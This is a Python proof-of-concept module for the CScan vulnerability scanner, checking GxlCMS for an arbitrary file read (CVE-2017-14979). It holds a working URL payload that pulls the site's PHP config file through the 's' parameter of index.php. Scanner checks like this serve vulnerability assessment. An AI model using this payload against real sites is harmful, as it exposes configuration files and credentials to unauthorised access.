# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'GxlCMS_0001'  # 平台漏洞编号，留空
    name = 'GxlCMS任意文件读取漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2017-10-18'  # 漏洞公布时间
    desc = '''
        Gxlcms是一套企业网站创建系统。
        Gxlcms中存在安全漏洞，该漏洞源于程序使用不安全的方法限制访问。远程攻击者可通过向index.php文件发送带有更改的路径名的‘s’参数利用该漏洞读取任意文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-32294'  # 漏洞来源
    cnvd_id = 'CNVD-2017-32294'  # cnvd漏洞编号
    cve_id = 'CVE-2017-14979'  # cve编号
    product = 'GxlCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4c8423e9-07e8-45d4-bb96-8b6b835f7bd1'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Conf||config*php'
            url = self.target + payload
            r = requests.get(url)

            if '<?php' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
